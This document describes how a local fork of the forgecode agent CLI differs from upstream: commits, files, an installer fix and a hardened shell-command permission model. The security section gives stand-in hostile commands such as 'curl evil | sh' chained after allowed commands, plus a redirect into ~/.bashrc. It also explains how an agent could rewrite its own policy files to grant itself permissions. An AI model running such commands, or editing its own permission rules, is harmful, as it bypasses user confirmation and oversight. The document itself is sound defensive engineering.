# Fork Differences: `mymain` vs `main`

> Snapshot date: 2026-05-19
> Merge base: `27521ed22fdb0a4e3fa5d6cf657aecf78e882fa0`

This document describes the exact divergence between the local development
branch `mymain` and the upstream tracking branch `main` (i.e. the upstream
[`antinomyhq/forgecode`](https://github.com/antinomyhq/forgecode) `main`).

## Summary

- `mymain` is a **strict superset** of `main`: every commit reachable from
  `main` is also reachable from `mymain`.
- `mymain` adds **4 non-merge commits** and **3 new tracked files** plus a
  one-character whitespace fix in one existing file.
- There are **zero commits** in `main` that are not in `mymain`.

Reproduce locally with:

```bash
git fetch origin
git log --oneline main..mymain     # commits only on mymain
git log --oneline mymain..main     # commits only on main (should be empty)
git diff --stat main..mymain       # file-level summary
```

## File-level diff

```text
 Justfile                                           | 720 ++++++++++++++++++
 cli                                                | 814 +++++++++++++++++++++
 crates/forge_main/src/info.rs                      |   2 +-
 plans/2026-05-05-emacs-native-forge-frontend-v1.md | 322 ++++++++
 4 files changed, 1857 insertions(+), 1 deletion(-)
```

| File | Status on `main` | Status on `mymain` | Purpose |
|---|---|---|---|
| `Justfile` | absent | new, 720 lines | Local developer task runner (build, test, lint, fzf workflows). |
| `cli` | absent | new, 814 lines | Forked POSIX-sh installer with a fix for shell-RC clobbering. |
| `plans/2026-05-05-emacs-native-forge-frontend-v1.md` | absent | new, 322 lines | Planning doc for the Emacs-native Forge frontend track (not shipped). |
| `crates/forge_main/src/info.rs` | trailing space on doc line 78 | trailing space removed | Pure whitespace clean-up; no behaviour change. |

## Non-merge commits unique to `mymain`

In topological order (oldest first):

1. **`53b0a9da6`** `added Justfile`
   Initial check-in of a local `Justfile` for build / test / lint / fzf
   developer workflows.

2. **`38a14ae57`** `add plan`
   Adds `plans/2026-05-05-emacs-native-forge-frontend-v1.md` -- a planning
   document for the experimental Emacs-native Forge frontend integration
   (the `mymain` branch is named to match the parallel `mymain` branches
   in the user's GNU Emacs, Homebrew formula, and Ghostty repos).

3. **`3acb63df2`** `update!`
   Expands the `Justfile` with additional recipes (lint, verify, fzf-based
   pickers).

4. **`82ca83681`** `fix(install): skip shell RC modification when PATH is already configured`
   - Re-adds the installer as a tracked `cli` file (it had been removed
     upstream when the install URL moved from `/install.sh` to `/cli`).
   - Fixes a real bug in `ensure_install_dir_shell_path()`: the upstream
     installer unconditionally prepended `~/.local/bin` to `.bashrc` /
     `.zshrc` on every run, clobbering existing shell configurations
     (e.g. when PATH was already set via a `path+=()` entry in
     `~/.zshenv`).
   - The patched function now early-returns if either (a) the directory
     is already on the runtime `$PATH`, or (b) any common startup file
     (`.zshenv`, `.zshrc`, `.bashrc`, `.bash_profile`, `.profile`)
     already references it.
   - Also includes the whitespace cleanup in
     `crates/forge_main/src/info.rs:78`.

5. **`de14b1e89`** `update plan`
   Updates the Emacs-native frontend planning document (restructure + new
   tracks D-F).

## Merge commits

The remaining commits unique to `mymain` are merge commits that pull `main`
into `mymain` to keep the fork up to date. They contribute no new file
content of their own. Listed for completeness:

```text
3b09f1043  Merge branch 'main' into mymain
6d769f004  Merge branch 'main' of https://github.com/antinomyhq/forgecode into mymain
5aeec4c93  Merge branch 'main' of https://github.com/antinomyhq/forgecode into mymain
bea2f8852  Merge branch 'main' of https://github.com/antinomyhq/forgecode into mymain
d311cdd2d  Merge branch 'main' of https://github.com/antinomyhq/forgecode into mymain
d20f1880b  Merge branch 'main' of https://github.com/antinomyhq/forgecode into mymain
183d258fc  Merge branch 'main' into mymain
42b912ed5  Merge branch 'main' of https://github.com/antinomyhq/forgecode into mymain
5a5aec271  Merge branch 'main' into mymain
d2c982798  Merge branch 'main' into mymain
a556ba8e3  Merge branch 'main' of https://github.com/antinomyhq/forgecode into mymain
baefd4a23  Merge branch 'main' of https://github.com/antinomyhq/forgecode into mymain
d1fd0ce99  Merge branch 'main' into mymain
e3169544e  Merge branch 'main' into mymain
```

## Branch policy

- `main` tracks `origin/main`, which is a mirror of upstream
  `antinomyhq/forgecode` `main`. Treat it as read-only.
- `mymain` is the active development branch. All local work lands here and
  is periodically fast-forwarded onto upstream `main` via merges.
- Pushing to `upstream` is disallowed by convention -- push only to
  `origin`.

## What is *not* changed

The Rust source tree under `crates/` is identical between the two branches
except for the one-character whitespace fix in
`crates/forge_main/src/info.rs:78`. There are no behavioural, API, or
dependency differences in the compiled `forge` binary between `main` and
`mymain`.

> **Note (2026-08-21):** the paragraph above describes the 2026-05-19
> snapshot. Since then the fork has intentionally diverged in behaviour;
> see the section below.

## Security posture (fork divergence, 2026-08-21)

The fork hardens the shell-command permission model relative to upstream
(epic `forgecode-shell-policy-hardening`):

- **Restricted mode is on by default.** The embedded defaults
  (`crates/forge_config/.forge.toml`) set `restricted = true`, so the
  policy engine is consulted for every tool call. Upstream defaults to
  `restricted = false`, which disables permission checks entirely. Opt out
  with `restricted = false` in `~/.forge/.forge.toml`.
- **Commands and URL fetches confirm by default.** The default policy file
  (`crates/forge_services/src/permissions.default.yaml`, materialised as
  `permissions.yaml` on first use) drops upstream's blanket
  `allow`/`command: "*"` and `allow`/`url: "*"` rules; reads and writes stay
  allow-all. Confirmation comes from the *absence* of a rule, because
  `PolicyEngine` already defaults to `Confirm` when nothing matches. A
  `confirm`/`command: "*"` catch-all would be worse than useless: the engine
  returns the first matching `Deny`/`Confirm` and discards any `Allow` it has
  already seen, so the catch-all would shadow every allow rule — including
  the ones "Accept and Remember" writes — and re-prompt forever. An existing
  `permissions.yaml` is never rewritten, so installs that predate this change
  keep their old (allow-all) file until it is deleted or edited.
- **Forge cannot rewrite its own permissions.** The default policy denies
  writes to `permissions.yaml`, `.forge.toml` and anything under a `forge` /
  `.forge` directory. Without that, the write allow-all would let an agent
  grant itself blanket command permissions — or set `restricted = false` —
  with the ordinary write tool and never prompt. `Deny` wins over `Allow` in
  the engine, so these rules survive the allow-all that follows them.
- **"Accept and Remember" stores exact commands.** Remembering an accepted
  command writes a glob-escaped exact-match execute rule instead of the
  upstream `<cmd> <subcmd>*` prefix glob, which also matched compound
  commands such as `git push; curl evil | sh`.
- **Execute rules are matched per simple command.** Commands are parsed with
  `tree-sitter-bash` (`crates/forge_services/src/command_extract.rs`) and each
  simple command — including those inside pipelines, `&&`/`;` lists,
  subshells and `$()` substitutions — is matched separately, so `git *` no
  longer auto-allows `git status && curl evil | sh`. Redirections stay
  attached to the statement they belong to (`cargo test > ~/.bashrc` is not
  reduced to `cargo test`), and anything the parser cannot model safely —
  syntax errors, standalone assignments, `export`/`declare`/`unset` — falls
  back to `Confirm` rather than being auto-allowed. On Windows, where
  commands run through `cmd.exe` rather than a POSIX shell, the raw-string
  verdict is kept because the bash grammar does not describe that syntax.
